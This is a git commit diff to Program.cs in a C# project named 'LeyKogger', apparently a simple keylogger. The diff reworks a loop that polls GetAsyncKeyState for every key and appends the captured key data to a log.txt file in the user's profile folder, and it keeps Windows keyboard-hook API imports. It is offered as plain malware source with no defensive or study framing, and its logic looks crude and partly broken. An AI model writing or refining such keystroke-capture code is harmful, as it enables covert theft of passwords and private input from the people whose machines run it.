2d2f66681778aaee21a6fb8a9c971c6b29db50fc
mbarycki <mbarycki@uni.opole.pl>
2021-05-20 13:01:55 +0200

    1

--- Program.cs
+++ Program.cs
@@ -14,6 +14,7 @@ namespace LeyKogger
     {
         private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
         private static bool[] keyboardState = new bool[256];
+        private static char[] keys = new char[265];
 
         private static void Initiate()
         {
@@ -23,38 +24,45 @@ namespace LeyKogger
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        private static void ReadKeyboard(char[] keys)
+        private static char[] ReadKeyboard(char[] keys)
         {
             for (int x = 0; x < 256; x++)
                 keys[x] = (char)(GetAsyncKeyState(x) >> 8);
+            return keys;
         }
 
         static void Main()
         {
-            string buf = "";
+            string buffer = "";
             int state = 0;
             int nextState = 0;
 
             while (true)
             {
-                Thread.Sleep(75);
+                keys = ReadKeyboard(keys);
+                foreach (char c in keys)
+                    if (c != 0)
+                        buffer += c;
+                File.AppendAllText(path, buffer);
+                buffer = "";
+
+                /*Thread.Sleep(75);
                 for (short i = 0; i < 256; i++)
                 {
-
-                    /*state = GetAsyncKeyState(i);                    
+                    state = GetAsyncKeyState(i);                    
                     if (state != 0 && state != nextState)
                     {
-                        //buf += ((Keys)i).ToString();
-                        buf += (char)(state >> 8);
-                        if (buf.Length > 10)
+                        buffer += ((Keys)i).ToString();
+                        //buffer += (char)(state >> 8);
+                        if (buffer.Length > 10)
                         {
-                            File.AppendAllText(path, buf);
-                            buf = "";                            
+                            File.AppendAllText(path, buffer);
+                            buffer = "";                            
                         }
                         //nextState = state;
                         state = 0;
-                    }   */
-                }
+                    }   
+                }*/
             }
         }
 
@@ -65,9 +73,6 @@ namespace LeyKogger
 
         [DllImport("user32.dll")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
         [DllImport("user32.dll")]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
